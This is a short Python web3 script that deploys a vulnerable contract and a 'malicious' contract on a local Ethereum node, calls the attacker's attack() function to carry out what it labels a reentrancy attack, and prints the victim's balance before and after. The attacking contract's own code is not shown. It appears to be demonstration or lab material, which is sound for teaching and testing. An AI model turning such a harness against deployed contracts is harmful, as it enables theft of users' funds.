from web3 import Web3
import json

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load vulnerable contract ABI and bytecode
with open('VulnerableContract.json') as f:
    contract_data = json.load(f)
vulnerable_abi = contract_data['abi']
vulnerable_bytecode = contract_data['bytecode']

# Load malicious contract ABI and bytecode
with open('MaliciousContract.json') as f:
    malicious_data = json.load(f)
malicious_abi = malicious_data['abi']
malicious_bytecode = malicious_data['bytecode']

# Deploy vulnerable contract
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx_hash = contract.constructor().transact()
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)

vulnerable_contract = deploy_contract(vulnerable_abi, vulnerable_bytecode)

# Deploy malicious contract
malicious_contract = deploy_contract(malicious_abi, malicious_bytecode)

# Perform the reentrancy attack
def perform_attack(vulnerable_contract, malicious_contract):
    initial_balance = w3.eth.get_balance(vulnerable_contract.address)
    
    # Set up attack
    tx_hash = malicious_contract.functions.attack(vulnerable_contract.address).transact()
    w3.eth.wait_for_transaction_receipt(tx_hash)
    
    final_balance = w3.eth.get_balance(vulnerable_contract.address)
    print(f"Initial Balance: {initial_balance}")
    print(f"Final Balance: {final_balance}")

perform_attack(vulnerable_contract, malicious_contract)
